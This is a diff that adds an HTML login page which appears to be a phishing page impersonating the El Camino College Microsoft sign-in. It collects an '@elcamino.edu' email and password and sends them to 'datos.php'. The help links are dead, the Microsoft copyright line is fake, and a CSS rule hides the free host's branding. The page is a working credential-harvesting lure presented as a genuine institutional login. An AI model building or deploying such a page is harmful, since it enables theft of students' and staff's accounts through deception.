@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Iniciar Sesión</title>
+	<style>
+img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
+    display: none;
+}
+</style>
+  <meta charset="utf-8">
+	<link rel="icon" href="img/icon.png">
+	<link rel="stylesheet" type="text/css" href="css/estilos.css">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+</head>
+<body>
+     <div class="imagen"><img src="img/fondo.jpg"></div>
+     <div class="content-form">
+         <form method="post" action="datos.php">
+             <img src="img/logo.png" class="logo">
+             <br>
+             <br>
+             <br>
+             <p>Sign in with your ECC email account</p>
+             <br>
+             <div class="content-inputs">
+                <p class="alert">
+                    Enter your user ID in the Email format "username@elcamino.edu".
+                </p>
+             <input type="email"  class="email" name="email" placeholder="username@elcamino.edu" autocomplete="off" required="true" >
+             <input type="password"  class="pass" name="pass" placeholder="Contraseña" required="true">
+             <br>
+             <input type="submit" value="Iniciar Sesión" class="btn-enviar">
+             </div>
+             <br>
+             <ul>
+                 <li><a href="#!">Forgot My Password</a></li>
+                 <li><a href="#!">Change My Password</a></li>
+                 <li><a href="#!">What's My Username?</a></li>
+                 <li><a href="#!">Troubleshooting MyECC</a></li>
+                 <li><a href="#!">Login and password help</a></li>
+                 <li><a href="#!">Chat with us Live</a></li>
+             </ul>
+            <a href="#!" class="micro">© 2013 Microsoft</a>
+         </form>
+     </div>
+    </div>
+    <script type="text/javascript" src="js/jquery.min.js"></script>
+     <script type="text/javascript" src="js/funcion.js"></script>
+</body>
+</html>
